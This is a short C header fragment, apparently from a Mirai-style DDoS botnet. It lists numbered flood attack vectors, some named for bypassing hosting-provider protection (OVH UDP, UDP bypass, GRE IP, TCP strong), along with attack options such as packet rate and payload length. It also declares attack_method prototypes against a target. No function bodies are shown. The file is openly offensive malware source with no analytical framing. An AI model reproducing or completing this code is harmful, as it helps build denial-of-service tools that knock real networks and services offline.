...
#define ATK_VEC_URGPLAIN   6
#define ATK_VEC_NUDP       7
#define ATK_VEC_GREIP      8
#define ATK_VEC_STDHEX     9
#define ATK_VEC_UDPHEX     10
#define ATK_VEC_OVHUDP     11
#define ATK_VEC_TCPPLAIN   12
#define ATK_VEC_UDPKICK    13
#define ATK_VEC_UDPBYPASS  14
#define ATK_VEC_STDPLAIN   15
#define ATK_VEC_TCPSTRONG  16
...
#define ATK_OPT_PAYLOAD_MINLEN  26
#define ATK_OPT_PAYLOAD_MAXLEN  27
#define ATK_OPT_MAXPPS          28
...
void attack_method_tcpplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
...
void attack_method_ovhudp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_synurgplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpkick(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpbypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_stdplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpstrong(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
